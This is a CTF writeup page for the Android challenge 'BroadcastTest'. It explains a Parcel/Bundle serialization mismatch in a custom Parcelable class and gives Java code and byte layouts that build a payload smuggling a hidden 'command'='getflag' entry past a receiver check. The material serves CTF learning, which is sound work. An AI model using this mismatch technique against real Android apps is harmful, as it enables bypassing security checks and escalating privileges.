<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>BroadcastTest | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for BroadcastTest" />
    <meta property="og:description" content="Writeup for BroadcastTest" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      min-height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      min-height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                writeup
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#background">background</a>
    
                <a class="dropdown-item" href="#theory">theory</a>
    
                <a class="dropdown-item" href="#exploit">exploit</a>
    
                <a class="dropdown-item" href="#other">other</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">writeup</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#background" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">background</span>
            </a>
    
<a href="#theory" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">theory</span>
            </a>
    
<a href="#exploit" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">exploit</span>
            </a>
    
<a href="#other" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">other</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="broadcasttest"><a class="header-link" href="#broadcasttest"></a>BroadcastTest</h1>
<h2 id="writeup"><a class="header-link" href="#writeup"></a>Writeup</h2>
<h3 id="background"><a class="header-link" href="#background"></a>background</h3>
<p>We reverse the apk and find out that we only have 4 classes: <code>MainActivity$Message</code>, <code>Receiver</code>1-3. and <code>MainActivity$Message</code> implement from Parcelable class.</p>
<p><code>Receiver1</code> is exported. It receive global broadcast and send the bundle to <code>Receiver2</code>.</p>
<p><code>Receiver2</code> and <code>Recevier3</code> isn&#39;t exported, so they can only receive broadcasts from this apk.</p>
<p>The procedure is </p>
<ol class="list">
<li><code>Receiver1</code> receive the data from broadcast, and decode it by base64, then marshall it to a bundle, and send it as a broadcast to <code>Receiver2</code>.</li>
<li><code>Receiver2</code> check the &quot;command&quot;, assert value != &#39;getflag&#39;, then send it to <code>Receiver3</code>.</li>
<li><code>Receiver3</code> check the &quot;command&quot;, assert value == &#39;getflag.</li>
</ol>
<p>I search the parcel and bundle then find <a href="https://www.ms509.com/2018/07/03/bundle-mismatch">this article</a> and CVE-2017-13288.</p>
<h3 id="theory"><a class="header-link" href="#theory"></a>theory</h3>
<p>Android can marshal an object by implementing from Parceable.
The class must implement <code>writeToParcel</code> and <code>readFromParcel</code> method to describe how to marshal and unmarshal.
Parcelable object needs to be taken by Bundle, which is a hashmap.
Bundle can be put key-value by <code>PutExtra(key, value)</code>. The type of value can be int, Boolean, String or Parcelable object etc. </p>
<pre class="hljs"><code><span class="hljs-comment">// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_NULL = -<span class="hljs-number">1</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_STRING = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_INTEGER = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_MAP = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_BUNDLE = <span class="hljs-number">3</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_PARCELABLE = <span class="hljs-number">4</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_SHORT = <span class="hljs-number">5</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_LONG = <span class="hljs-number">6</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> VAL_FLOAT = <span class="hljs-number">7</span>;</code></pre><p>It will write len of total, magic number, and key-value pairs. 
From <code>BaseBundle.writeToParcelInner</code>:</p>
<pre class="hljs"><code><span class="hljs-keyword">int</span> lengthPos = parcel.dataPosition();
parcel.writeInt(-<span class="hljs-number">1</span>); <span class="hljs-comment">// dummy, will hold length</span>
parcel.writeInt(BUNDLE_MAGIC);
<span class="hljs-keyword">int</span> startPos = parcel.dataPosition();
parcel.writeArrayMapInternal(map);
<span class="hljs-keyword">int</span> endPos = parcel.dataPosition();
<span class="hljs-comment">// Backpatch length</span>
parcel.setDataPosition(lengthPos);
<span class="hljs-keyword">int</span> length = endPos - startPos;
parcel.writeInt(length);
parcel.setDataPosition(endPos);</code></pre><p><code>pacel.writeArrayMapInternal</code> will write the number of hashmap, then key and value.</p>
<pre class="hljs"><code><span class="hljs-comment">/**
   * Flatten an ArrayMap into the parcel at the current dataPosition(),
   * growing dataCapacity() if needed.  The Map keys must be String objects.
   */</span>
  <span class="hljs-comment">/* package */</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">writeArrayMapInternal</span><span class="hljs-params">(ArrayMap&lt;String, Object&gt; val)</span> </span>{
...
      <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> N = val.size();
      writeInt(N);
     ... 
      <span class="hljs-keyword">int</span> startPos;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;N; i++) {
          <span class="hljs-keyword">if</span> (DEBUG_ARRAY_MAP) startPos = dataPosition();
          writeString(val.keyAt(i));
          writeValue(val.valueAt(i));
...</code></pre><p><code>writeValue</code> will write the type and value. If the type is Parceable, writing will call <code>writeParcelable</code> method, which call <code>writeToParcel</code> in <code>Parcelable</code> object.</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeValue</span><span class="hljs-params">(Object v)</span> </span>{
        <span class="hljs-keyword">if</span> (v == <span class="hljs-keyword">null</span>) {
            writeInt(VAL_NULL);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> String) {
            writeInt(VAL_STRING);
            writeString((String) v);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Integer) {
            writeInt(VAL_INTEGER);
            writeInt((Integer) v);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Map) {
            writeInt(VAL_MAP);
            writeMap((Map) v);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Bundle) {
            <span class="hljs-comment">// Must be before Parcelable</span>
            writeInt(VAL_BUNDLE);
            writeBundle((Bundle) v);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> PersistableBundle) {
            writeInt(VAL_PERSISTABLEBUNDLE);
            writePersistableBundle((PersistableBundle) v);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">instanceof</span> Parcelable) {
            <span class="hljs-comment">// IMPOTANT: cases for classes that implement Parcelable must</span>
            <span class="hljs-comment">// come before the Parcelable case, so that their specific VAL_*</span>
            <span class="hljs-comment">// types will be written.</span>
            writeInt(VAL_PARCELABLE);
            writeParcelable((Parcelable) v, <span class="hljs-number">0</span>);</code></pre><p>We can use this code to get the bytes from marshal.</p>
<pre class="hljs"><code>Bundle bundle = <span class="hljs-keyword">new</span> Bundle();
bundle.putParcelable(AccountManager.KEY_INTENT, <span class="hljs-keyword">new</span> MainActivity$Message()));
<span class="hljs-keyword">byte</span>[] bs = {<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>};
bundle.putByteArray(<span class="hljs-string">&quot;AAA&quot;</span>, bs);
Parcel testData = Parcel.obtain();
bundle.writeToParcel(testData, <span class="hljs-number">0</span>);
<span class="hljs-keyword">byte</span>[] raw = testData.marshall();</code></pre><p class="img-container"><img src="./1.png" alt=""></p>
<p><code>writeString</code>will put &#39;\0&#39; to the end of string. 
PAD_SIZE will make the length of unit be the multipiles of 4.</p>
<h3 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h3>
<p><code>MainActivity$Message</code> is a class implementing from <code>Parceable</code>.
There are two type-difference:</p>
<ol class="list">
<li><pre class="prettyprint">this.txRate = in.readInt();
dest.writeByte((byte) this.txRate);
</pre>
</li>
<li><pre class="prettyprint">this.rttSpread = in.readLong();
dest.writeInt((int) this.rttSpread);
</pre>
</li>
</ol>
<p>Through test I found that the first type-difference which in byte and int will not create influence, because of PAD_SIZE.
So the second type-difference will cover 4 bytes after <code>Message</code> object every times <code>readFromParcel</code> and <code>writeToParcel</code>.</p>
<p>The intent of this challenge is to hide a key-value pair <code>&#39;command&#39;=&#39;getflag&#39;</code>, and expose it when it reads again.</p>
<p>The order of bundle is &#39;length of key, content of key, type of value, length of value, content of value&#39;.</p>
<p>It means that the writing will cover <code>length of key</code> and make the first 4 bytes of origin <code>content of key</code> the new <code>length of key</code>.</p>
<p>So we can construct this payload:</p>
<table>
<thead>
<tr>
<th>Message</th>
<th>len_key</th>
<th>content_key</th>
<th>type_value</th>
<th>len_value</th>
<th>content_value</th>
</tr>
</thead>
<tbody><tr>
<td>pad</td>
<td>15 00 00 00</td>
<td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
<td>00 00 00 00</td>
<td>03 00 00 00</td>
<td>&quot;pad&quot;</td>
</tr>
<tr>
<td>pad 15 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;command&quot; 00 00</td>
<td>00 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;getflag&quot; 00 00</td>
</tr>
</tbody></table>
<p>The format of string is UTF-16, two bytes every char.
type=0 means <code>VAL_STRING</code>.</p>
<p>Another need to do is that <code>Receiver2</code> need <code>bundle.getString(&quot;command&quot;)!=null</code>, so we need another key-value pair <code>&#39;command&#39;=&#39;xxx&#39;</code>.</p>
<p>So one of the payloads is:</p>
<pre class="hljs"><code>        Parcel a = Parcel.obtain();
        Parcel b = Parcel.obtain();
        a.writeInt(<span class="hljs-number">3</span>);<span class="hljs-comment">//Count</span>
        a.writeString(<span class="hljs-string">&quot;mismatch&quot;</span>);
        a.writeInt(<span class="hljs-number">4</span>);<span class="hljs-comment">//Parcable</span>
        a.writeString(<span class="hljs-string">&quot;com.de1ta.broadcasttest.MainActivity$Message&quot;</span>);
        a.writeString(<span class="hljs-string">&quot;bssid&quot;</span>);
        a.writeInt(<span class="hljs-number">1</span>);
        a.writeInt(<span class="hljs-number">2</span>);
        a.writeInt(<span class="hljs-number">3</span>);
        a.writeInt(<span class="hljs-number">4</span>);
        a.writeInt(<span class="hljs-number">5</span>);
        a.writeInt(<span class="hljs-number">6</span>);
        a.writeInt(<span class="hljs-number">7</span>);
        a.writeLong(<span class="hljs-number">8</span>);
        a.writeInt(<span class="hljs-number">9</span>);
        a.writeInt(<span class="hljs-number">10</span>);
        a.writeInt(-<span class="hljs-number">1</span>);
        a.writeLong(<span class="hljs-number">11</span>);
        a.writeLong(<span class="hljs-number">12</span>);
        a.writeLong(<span class="hljs-number">0x11223344</span>);
        <span class="hljs-comment">// fake map</span>
        <span class="hljs-comment">// \7\0 =&gt; hide_len_key</span>
        <span class="hljs-comment">// command\0 =&gt; hide_content_key</span>
        <span class="hljs-comment">// \0\0 =&gt; hide_type_value</span>
        <span class="hljs-comment">// \7\0 =&gt; hide_len_value</span>
        <span class="hljs-comment">// getflag\0 =&gt; hide_content_value</span>
        a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag&quot;</span>);
        a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
        a.writeString(<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-comment">//fake_value</span>
        a.writeString(<span class="hljs-string">&quot;command&quot;</span>);<span class="hljs-comment">//for bundle.getString(&quot;command&quot;)!=null</span>
        a.writeInt(<span class="hljs-number">0</span>);
        a.writeString(<span class="hljs-string">&quot;gotflag&quot;</span>);
        <span class="hljs-keyword">int</span> len = a.dataSize();
        b.writeInt(len);
        b.writeInt(<span class="hljs-number">0x4c444E42</span>);
        b.appendFrom(a, <span class="hljs-number">0</span>, len);
        b.setDataPosition(<span class="hljs-number">0</span>);

        <span class="hljs-keyword">byte</span>[] raw = b.marshall();
        String output = Base64.encodeToString(raw, <span class="hljs-number">0</span>);
        Log.i(<span class="hljs-string">&quot;test&quot;</span>, output);</code></pre><h3 id="other"><a class="header-link" href="#other"></a>Other</h3>
<p>I use this payload1 in match:</p>
<pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag\0&quot;</span>);
a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
a.writeString(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>But marshaling shows that fake_key contains 3 zero char after &#39;getflag&#39;. It costs 6 bytes.
I search it and find that <code>writeString</code> method will put &#39;\0&#39; to the end of string, then pad size.</p>
<p>But if I remove the zero, <code>writeString(&quot;\7\0command\0\0\0\7\0getflag&quot;)</code>, the end zero will be at the end. It costs 44 bytes without padding.
The structure is </p>
<table>
<thead>
<tr>
<th>Message</th>
<th>len_key</th>
<th>content_key</th>
<th>type_value</th>
<th>len_value</th>
<th>content_value</th>
<th>len_key2</th>
<th>content_key2</th>
<th>type_value2</th>
<th>len_value2</th>
<th>content_value2</th>
</tr>
</thead>
<tbody><tr>
<td>pad</td>
<td>15 00 00 00</td>
<td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
<td>00 00 00 00</td>
<td>01 00 00 00</td>
<td>&quot;1&quot;</td>
<td>07 00 00 00</td>
<td>&quot;command&quot;</td>
<td>00 00 00 00</td>
<td>00 00 00 00</td>
<td>null</td>
</tr>
<tr>
<td>pad 15 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;command&quot; 00 00</td>
<td>00 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;getflag&quot; 00 00</td>
<td>00 00 00 00</td>
<td>01 00 00 00</td>
<td>&quot;1&quot;</td>
<td>07 00 00 00</td>
<td>&quot;command&quot;</td>
</tr>
</tbody></table>
<p>We can find the <code>type_value2</code> is error.
So we need to construct <code>fake_value1=&quot;&quot;</code>.</p>
<table>
<thead>
<tr>
<th>Message</th>
<th>len_key</th>
<th>content_key</th>
<th>type_value</th>
<th>len_value</th>
<th>content_value</th>
<th>len_key2</th>
<th>content_key2</th>
<th>type_value2</th>
<th>len_value2</th>
<th>content_value2</th>
</tr>
</thead>
<tbody><tr>
<td>pad</td>
<td>15 00 00 00</td>
<td>07 00 00 00 &quot;command&quot; 00 00 00 00 00 00 07 00 00 00 &quot;getflag&quot; 00 00</td>
<td>00 00 00 00</td>
<td>00 00 00 00</td>
<td>00 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;command&quot;</td>
<td>00 00 00 00</td>
<td>00 00 00 00</td>
<td>null</td>
</tr>
<tr>
<td>pad 15 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;command&quot; 00 00</td>
<td>00 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;getflag&quot; 00 00</td>
<td>00 00 00 00</td>
<td>00 00 00 00</td>
<td>00 00 00 00</td>
<td>07 00 00 00</td>
<td>&quot;command&quot;</td>
</tr>
</tbody></table>
<p>This is the payload2:</p>
<pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag&quot;</span>);
a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
a.writeString(<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>For validating my suppose, I use payload3:</p>
<pre class="hljs"><code>a.writeString(<span class="hljs-string">&quot;\7\0command\0\0\0\7\0getflag\0\0&quot;</span>);
a.writeInt(<span class="hljs-number">0</span>);<span class="hljs-comment">//fake_type</span>
a.writeString(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-comment">//fake_value</span></code></pre><p>The bundle created by this payload should be the same as the bundle created by payload1 except <code>length</code>.
Yes, it is.
But <code>Receiver3</code> refuse the bundle and raise a exception.
I check it and find the order changed:
<code>&#39;\7\0command...getflag\0\0&#39;=&#39;1&#39;, Message, &#39;command&#39;=&#39;gotflag&#39;</code>
It means that the payload is correct but it covered <code>&#39;command&#39;=&#39;gotflag&#39;</code>.</p>
<p>And there is a warning in logcat:</p>
<pre class="hljs"><code>&gt;&gt;W/ArrayMap: New hash -1841832101 is before end of<span class="hljs-built_in"> array </span>hash -1212575282 at index 1 key ��command��������getflag����</code></pre><p>So the question is Bundle use Arraymap, whose order is decided by hash of the key.
We change the key, the hash is changed.
It needs to be lower than the hash of key of Message.</p>
<p>Here is the source:</p>
<pre class="hljs"><code>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">append</span><span class="hljs-params">(K key, V value)</span> </span>{
        <span class="hljs-keyword">int</span> index = mSize;
        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> hash = key == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span>
                : (mIdentityHashCode ? System.identityHashCode(key) : key.hashCode());
        <span class="hljs-keyword">if</span> (index &gt;= mHashes.length) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">&quot;Array is full&quot;</span>);
        }
        <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-number">0</span> &amp;&amp; mHashes[index-<span class="hljs-number">1</span>] &gt; hash) {
            RuntimeException e = <span class="hljs-keyword">new</span> RuntimeException(<span class="hljs-string">&quot;here&quot;</span>);
            e.fillInStackTrace();
            Log.w(TAG, <span class="hljs-string">&quot;New hash &quot;</span> + hash
                    + <span class="hljs-string">&quot; is before end of array hash &quot;</span> + mHashes[index-<span class="hljs-number">1</span>]
                    + <span class="hljs-string">&quot; at index &quot;</span> + index + <span class="hljs-string">&quot; key &quot;</span> + key, e);
            put(key, value);
            <span class="hljs-keyword">return</span>;
        }</code></pre><p>So I think the value of hash is important to pwn the vulnerability.
The value of hash of key is <code>-1841832101</code>, so we just need to find a key with lower hash.</p>
<pre class="hljs"><code>        String key = <span class="hljs-string">&quot;mismatch&quot;</span>;
        <span class="hljs-keyword">while</span>(key.hashCode()&gt;=-<span class="hljs-number">1841832101</span>){
            key += <span class="hljs-string">&quot;.&quot;</span>;
        }
        a.writeString(key); <span class="hljs-comment">// key of Message object</span>
</code></pre><p><a href="./gen_payload.zip">This</a> is a project of AndroidStudio which can generate the exploit payload.</p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
